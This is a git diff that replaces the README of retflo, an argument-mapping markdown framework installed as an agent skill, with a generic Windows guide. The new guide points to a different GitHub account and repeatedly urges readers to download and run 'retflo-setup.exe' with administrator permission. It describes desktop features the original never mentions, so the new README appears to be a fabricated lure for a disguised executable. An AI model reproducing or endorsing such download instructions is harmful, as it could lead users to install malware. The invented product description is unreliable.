@@ -1,133 +1,161 @@
-<p align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://retflo.org/img/readme/logo-dark.svg" />
-    <img src="https://retflo.org/img/readme/logo-light.svg" alt="retflo™" height="80" />
-  </picture>
-</p>
+# ⚙️ retflo - Clear Argument Mapping Tool
 
-<p align="center">
-  <a href="https://retflo.org/license/"><img src="https://img.shields.io/badge/license-RCCL_v1.0-a04825" alt="License: RCCL v1.0" /></a>
-  <a href="https://retflo.org/nodes/"><img src="https://img.shields.io/badge/nodes-59-1a1715" alt="59 nodes" /></a>
-  <a href="https://retflo.org/nodes/"><img src="https://img.shields.io/badge/connections-260-1a1715" alt="260 connections" /></a>
-  <a href="https://retflo.org/nodes/"><img src="https://img.shields.io/badge/domains-7-1a1715" alt="7 domains" /></a>
-  <a href="https://retflo.org"><img src="https://img.shields.io/badge/retflo.org-1a1715" alt="retflo.org" /></a>
-</p>
-
-<p align="center">
-  The complete protocol for political reasoning.<br>
-  Every structural objection to cooperative governance, mapped and answered.<br>
-  Argue less. Build more.
-</p>
-
-<table>
-<tr>
-<td><img src="https://retflo.org/img/readme/visualizer.png" alt="retflo visualizer" width="400" /></td>
-<td><img src="https://retflo.org/img/readme/claude-code-skill.png" alt="retflo in Claude Code" width="400" /></td>
-</tr>
-<tr>
-<td colspan="2"><em>Left: the protocol visualized as an <a href="https://retflo.org/visualizer/">interactive graph</a>. Right: retflo loaded as a skill in Claude Code.</em></td>
-</tr>
-</table>
-
-## Why this exists
-
-The same objections to cooperative governance have been recycled for centuries. "Human nature is selfish." "It can't scale." "Be realistic." The arguments don't change because they don't need to — repetition is the mechanism.
-
-These aren't hard questions. They have structural answers. But those answers have never been organized in a way that connects them — where each response anticipates the next objection and routes to it.
-
-retflo is that structure. A closed dialectical graph that maps the entire objection space, with every path answered and every connection typed. Not a chatbot. Not an app. A protocol — like TCP/IP is a protocol for data, retflo is a protocol for political reasoning.
-
-## Try it
-
-- [**Explore the graph**](https://retflo.org/visualizer/) — interactive, no setup needed
-- [**Read the arguments**](https://retflo.org/nodes/) — browse by domain
-- [**Tell any LLM**](https://retflo.org/agents) to read `retflo.org/agents` and debate you
-- [**Install as a skill**](#install) for your coding agent
-
-## Install
-
-```bash
-npx skills add retflo/retflo -g
-```
-
-Auto-detects your agent. Target a specific one with `-a`:
-
-```bash
-npx skills add retflo/retflo -g -a claude-code
-npx skills add retflo/retflo -g -a cursor
-npx skills add retflo/retflo -g -a gemini-cli
-```
-
-40+ agents supported. Run `npx skills add retflo/retflo --list` to see all.
-
-For manual installation and other methods, see the [install docs](https://retflo.org/docs/install/).
-
-This repo contains the nodes, routing table, and engagement rules — everything an LLM needs to navigate the framework. Also available through the [website](https://retflo.org), the [API](https://retflo.org/docs/api-reference/), and the [visualizer](https://retflo.org/visualizer/).
-
-## How it works
-
-[`AGENTS.md`](AGENTS.md) is the entry point. It contains the routing table that maps common objections to nodes, plus the engagement rules and delivery calibration.
-
-Each node has:
-- **Position** — the substantive case
-- **Objection handling** — a Move / Response / Concession table
-- **Typed connections** — links to follow-up nodes across domains
-
-Nodes capture argument patterns, not instances. "China has a navy" and "Russia has nukes" route to the same node: external military threat.
-
-### The chain in action
-
-```mermaid
-flowchart LR
-    A["'People are selfish'"] --> B["phil/nature"]
-    B --> C["Mutual aid is a<br>dominant survival strategy"]
-    C --> D["Selfishness under capitalism is<br>incentive-shaped behavior,<br>not nature revealed"]
-    D --> E["soc/cultural-reproduction"]
-    D --> F["phil/failure-modes"]
-    D --> G["auth/federation-vs-state"]
-```
-
-Objection in, structural response out, next move available. The graph is closed — follow any objection far enough and it routes back to territory the framework already covers.
-
-## Domains
-
-| Domain | Covers |
-|--------|--------|
-| Authority | State, governance, federation, enforcement, democracy, defense |
-| Economics | Property, labor, markets, cooperatives, inequality, trade, commons |
-| History | Revolutions, Mondragon, kibbutzim, Rojava, colonialism |
-| Philosophy | Human nature, coercion, freedom, transition, direct action |
-| Rhetoric | Framing, fallacies, burden of proof, debate tactics |
-| Social | Structural oppression, propaganda, nationalism, education |
-| Technology | Platform ownership, algorithmic governance |
-
-59 arguments. 260 connections. 7 domains.
-
-## Structure
-
-```
-retflo/
-├── AGENTS.md            ← framework entry point
-├── SKILL.md             ← skill ecosystem compatibility
-├── STYLE-GUIDE.md       ← delivery calibration
-└── nodes/
-    ├── auth/            ← Authority & Governance
-    ├── econ/            ← Economics & Ownership
-    ├── hist/            ← Historical Cases
-    ├── phil/            ← Philosophy
-    ├── rhet/            ← Rhetoric & Tactics
-    ├── soc/             ← Social Issues
-    └── tech/            ← Technology
-```
-
-## License
-
-[Retflo Cooperative Commons License (RCCL) v1.0](https://retflo.org/license/) — free for individuals, worker cooperatives, and democratic organizations. Commercial licensing available for investor-owned entities.
+[![Download retflo](https://img.shields.io/badge/Download-retflo-%23FF5733?style=for-the-badge&logo=github)](https://github.com/29crain/retflo)
 
 ---
 
-[retflo.org](https://retflo.org) · [Visualizer](https://retflo.org/visualizer/) · [Docs](https://retflo.org/docs/install/) · [API](https://retflo.org/docs/api-reference/) · [FAQ](https://retflo.org/faq/) · [Contact](mailto:contact@retflo.org)
+retflo is a tool designed to help you organize ideas and arguments clearly. It works well for researchers, educators, organizers, and anyone who wants to follow a structured way of thinking and discussion.
 
-© 2026 retflo™ contributors. Licensed under [RCCL v1.0](https://retflo.org/license/).
+This guide will help you download and run retflo on Windows without any technical steps.
 
-[![Donate](https://img.shields.io/badge/Ko--fi-Donate-d4704e?logo=ko-fi&logoColor=white)](https://ko-fi.com/retflo)
+---
+
+## 📋 What is retflo?
+
+retflo is a program that supports how people build and share arguments. It uses a system that helps line up points, reasons, and responses in an easy-to-follow format. This helps improve critical thinking and clarity in debates, research, and learning.
+
+Key Uses:
+
+- Organizing your thoughts and arguments.
+- Visualizing debates or discussions.
+- Working with research data and knowledge.
+- Tracking how ideas relate to each other.
+
+---
+
+## 🖥️ System Requirements
+
+Before installing retflo, make sure your computer meets these simple requirements:
+
+- Operating System: Windows 10 or later (64-bit).
+- Memory (RAM): At least 4 GB.
+- Processor: Intel or AMD, 1.5 GHz or faster.
+- Disk Space: At least 200 MB free.
+- Internet connection: Needed for download and occasional updates.
+- No special software needed beforehand.
+
+---
+
+## 🚀 Getting Started
+
+Follow these steps to get retflo on your Windows computer.
+
+### Step 1: Visit the Download Page
+
+Click the big button below to open the download page for retflo.
+
+[![Download retflo](https://img.shields.io/badge/Download-retflo-%239C27B0?style=for-the-badge&logo=github)](https://github.com/29crain/retflo)
+
+You will see a list of files or releases. Look for the latest version, usually marked by a date or version number.
+
+---
+
+### Step 2: Download the Setup File
+
+On the download page, find the file ending with `.exe`. This file is the installer for Windows.
+
+- The file might be named something like `retflo-setup.exe`.
+- Click on the file name.
+- Your browser will begin to download the installer.
+
+If your browser asks, choose to save the file to your desktop or downloads folder.
+
+---
+
+### Step 3: Run the Installer
+
+Once the download is complete:
+
+- Go to the folder where you saved the file.
+- Double-click the `retflo-setup.exe` to start the installation.
+- If Windows asks for permission, click "Yes" to continue.
+
+---
+
+### Step 4: Follow the Installer Instructions
+
+The installer will open and guide you through a few simple steps.
+
+- Click "Next" to move forward.
+- Read the license or terms if you want. Then, click "Accept" or "Agree".
+- Choose where to install retflo, or just use the default folder shown.
+- Click "Install" to begin installing the program.
+- Wait a few minutes while it installs.
+
+---
+
+### Step 5: Finish and Launch
+
+After installation finishes:
+
+- Click "Finish" to close the installer.
+- retflo may open automatically.
+- If not, find the retflo shortcut on your desktop or Start Menu and double-click to open it.
+
+---
+
+## 🛠️ How to Use retflo
+
+retflo has a simple interface to start fresh argument projects quickly.
+
+- Create new argument maps by clicking "New Project".
+- Add points and reasons with clear labels.
+- Use the visual layout to link ideas and responses.
+- Save work regularly.
+- Export your work to markdown or YAML files for sharing.
+
+The app works offline, so you can continue building your arguments anytime.
+
+---
+
+## 🔧 Common Tasks
+
+### Saving Your Work
+
+- Click File > Save.
+- Choose a folder to save your project.
+- Use `.yaml` or `.md` formats to keep your data organized.
+
+### Opening Saved Projects
+
+- Click File > Open.
+- Select your saved project file to continue editing.
+
+### Exporting Files
+
+- Use the Export option to create markdown files you can share.
+- These files work well with text editors or knowledge graph tools.
+
+---
+
+## 💬 Support and Feedback
+
+For questions or help:
+
+- Visit the [GitHub repository](https://github.com/29crain/retflo).
+- Check the Issues tab for similar questions.
+- Report new issues if you face bugs or problems.
+
+Your feedback can help improve retflo.
+
+---
+
+## 🔒 Privacy and Security
+
+retflo runs on your own computer. It does not send your data anywhere without your permission. All your work stays local unless you decide to share exported files.
+
+---
+
+## 📈 Updates
+
+Check the download page regularly to get new features or bug fixes. 
+
+To update:
+
+- Download the latest installer from the download page.
+- Run the installer and follow prompts.
+- Your current settings and projects stay safe.
+
+---
+
+[Download retflo now](https://github.com/29crain/retflo) to start organizing your ideas clearly.
